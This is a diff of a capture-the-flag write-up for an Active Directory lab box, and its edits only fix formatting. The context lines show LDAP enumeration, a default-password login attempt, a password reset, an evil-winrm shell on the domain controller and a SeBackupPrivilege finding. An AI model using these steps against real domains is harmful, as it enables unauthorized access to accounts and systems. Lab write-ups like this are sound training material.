@@ -201,7 +201,7 @@ ldapsearch -x -H ldap://10.129.121.180 -b "DC=baby,DC=vl" "(objectCategory=perso
 nxc smb 10.129.121.180 -u 'Teresa.Bell' -p 'BabyStart123!' --users
 ```
 
-&#x20;**Result**: Password not working for Teresa.Bell account.
+**Result**: Password not working for Teresa.Bell account.
 
 ***
 
@@ -267,7 +267,7 @@ kpasswd Caroline.Robinson
 ldapsearch -x -H ldap://10.129.121.180 -D "Caroline.Robinson@baby.vl" -w 'pa$$w0rd' -b "DC=baby,DC=vl" "(sAMAccountName=Caroline.Robinson)" memberOf
 ```
 
-&#x20;**Key Finding**: Caroline.Robinson is a member of the **Remote Management Users Group**
+**Key Finding**: Caroline.Robinson is a member of the **Remote Management Users Group**
 
 ***
 
@@ -281,7 +281,7 @@ ldapsearch -x -H ldap://10.129.121.180 -D "Caroline.Robinson@baby.vl" -w 'pa$$w0
 evil-winrm -i 10.129.121.180 -u 'baby.vl\Caroline.Robinson' -p 'pa$$w0rd'
 ```
 
-&#x20;**Success**: Successfully obtained shell as Caroline.Robinson on the Domain Controller.
+**Success**: Successfully obtained shell as Caroline.Robinson on the Domain Controller.
 
 #### User Flag Retrieval
 
@@ -305,7 +305,7 @@ type C:\Users\Caroline.Robinson\Desktop\user.txt
 whoami /all
 ```
 
-&#x20;**Critical Discovery**: User has **SeBackupPrivilege** and **SeRestorePrivilege** enabled.
+**Critical Discovery**: User has **SeBackupPrivilege** and **SeRestorePrivilege** enabled.
 
 **Privilege Details**:
 
@@ -506,5 +506,4 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ***
 
-<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>
-
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
